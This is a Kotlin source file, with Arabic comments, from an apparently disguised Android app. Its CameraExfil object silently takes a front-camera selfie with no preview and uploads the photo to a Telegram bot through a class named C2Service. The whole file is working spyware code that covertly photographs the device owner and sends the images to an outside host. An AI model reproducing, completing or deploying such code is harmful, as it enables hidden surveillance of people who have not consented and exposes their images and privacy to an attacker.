package com.example.disguise.control

import android.content.Context
import android.util.Log
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleOwner
import com.example.disguise.core.C2Service
import com.example.disguise.core.TelegramReporter
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.File

/**
 * CameraExfil — يلتقط صوراً بصمت من الكاميرا الأمامية (سيلفي)
 * ويرسلها مباشرة إلى بوت تيليجرام.
 *
 * المسار: app/src/main/java/com/example/disguise/control/CameraExfil.kt
 */
object CameraExfil {

    private const val TAG = "CameraExfil"

    /**
     * التقاط صورة سيلفي بصمت (بدون إظهار واجهة الكاميرا).
     * 
     * @param context يجب أن يكون Activity (أو LifecycleOwner) لأن CameraX يحتاج دورة حياة.
     *                إذا تم استدعاؤه من الخلفية، يجب استخدام Foreground Service من نوع Camera.
     */
    fun takeSilentSelfie(context: Context) {
        // CameraX يحتاج LifecycleOwner (وهو MainActivity في حالتنا)
        val lifecycleOwner = context as? LifecycleOwner
        if (lifecycleOwner == null) {
            Log.e(TAG, "Context must be a LifecycleOwner (Activity)")
            return
        }

        val cameraProviderFuture = ProcessCameraProvider.getInstance(context)

        cameraProviderFuture.addListener({
            try {
                val cameraProvider = cameraProviderFuture.get()

                // إعداد الكاميرا الأمامية (سيلفي)
                val cameraSelector = CameraSelector.DEFAULT_FRONT_CAMERA

                // إعداد التقاط الصورة
                val imageCapture = ImageCapture.Builder()
                    .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                    .build()

                // ربط الكاميرا بدون Preview (لأننا لا نريد إظهار واجهة)
                cameraProvider.unbindAll()
                cameraProvider.bindToLifecycle(
                    lifecycleOwner,
                    cameraSelector,
                    imageCapture
                )

                // تحديد مكان حفظ الصورة (في الكاش الخاص بالتطبيق)
                val photoFile = File(
                    context.cacheDir,
                    "selfie_${System.currentTimeMillis()}.jpg"
                )

                // إعداد خيارات الحفظ
                val outputOptions = ImageCapture.OutputFileOptions.Builder(photoFile).build()

                // التقاط الصورة
                imageCapture.takePicture(
                    outputOptions,
                    ContextCompat.getMainExecutor(context),
                    object : ImageCapture.OnImageSavedCallback {
                        override fun onError(exc: ImageCaptureException) {
                            Log.e(TAG, "Photo capture failed: ${exc.message}", exc)
                        }

                        override fun onImageSaved(output: ImageCapture.OutputFileResults) {
                            Log.d(TAG, "Silent selfie saved successfully: ${photoFile.absolutePath}")
                            
                            // إرسال الصورة إلى تيليجرام في الخلفية
                            sendPhotoToTelegram(photoFile)
                            
                            // إلغاء ربط الكاميرا لتوفير الطاقة
                            cameraProvider.unbindAll()
                        }
                    }
                )
            } catch (exc: Exception) {
                Log.e(TAG, "Use case binding failed", exc)
            }
        }, ContextCompat.getMainExecutor(context))
    }

    /**
     * إرسال الصورة التي تم التقاطها إلى تيليجرام.
     */
    private fun sendPhotoToTelegram(photoFile: File) {
        val botToken = C2Service.DEFAULT_BOT_TOKEN
        val chatId = C2Service.DEFAULT_CHAT_ID

        if (botToken == "PUT_YOUR_BOT_TOKEN_HERE" || chatId == "PUT_YOUR_CHAT_ID_HERE") {
            Log.e(TAG, "Bot token or chat ID not configured.")
            return
        }

        val reporter = TelegramReporter(botToken, chatId)

        // نستخدم Coroutine للإرسال من الخلفية
        CoroutineScope(Dispatchers.IO).launch {
            try {
                // إرسال الصورة مع وصف يوضح أنها سيلفي
                reporter.sendPhoto(photoFile, caption = "📸 صورة سيلفي تم التقاطها (Silent Selfie)")
                
                // يمكنك حذف الملف بعد إرساله لتوفير المساحة (اختياري)
                // photoFile.delete() 
            } catch (e: Exception) {
                Log.e(TAG, "Failed to send selfie: ${e.message}", e)
            }
        }
    }
}
